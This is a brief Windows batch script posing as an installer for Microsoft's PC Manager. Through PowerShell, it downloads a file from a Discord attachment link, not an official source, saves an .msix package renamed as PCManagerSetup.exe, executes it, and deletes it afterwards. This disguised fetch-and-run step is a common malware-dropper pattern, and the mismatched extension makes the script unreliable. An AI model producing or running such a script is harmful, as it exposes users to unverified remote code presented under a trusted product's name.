@echo off
title Windows PC Manager Installer
echo.
echo Windows PC Manager Installer
echo =============================
echo Downloading..
powershell -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1057483613358276698/1240348534151315516/Microsoft.MicrosoftPCManager_3.9.3.0_x64_8wekyb3d8bbwe.msix?ex=665413d7&is=6652c257&hm=cd88a2ccc4c135e012c51aefc0c1d65ebc7b3c6934f361f1891b666ec1ec4202' -OutFile '%USERPROFILE%\Downloads\PCManagerSetup.exe'"
echo Installing..
"%USERPROFILE%\Downloads\PCManagerSetup.exe"
pause >nul
echo Cleaning up..
del "%USERPROFILE%\Downloads\PCManagerSetup.exe"
exit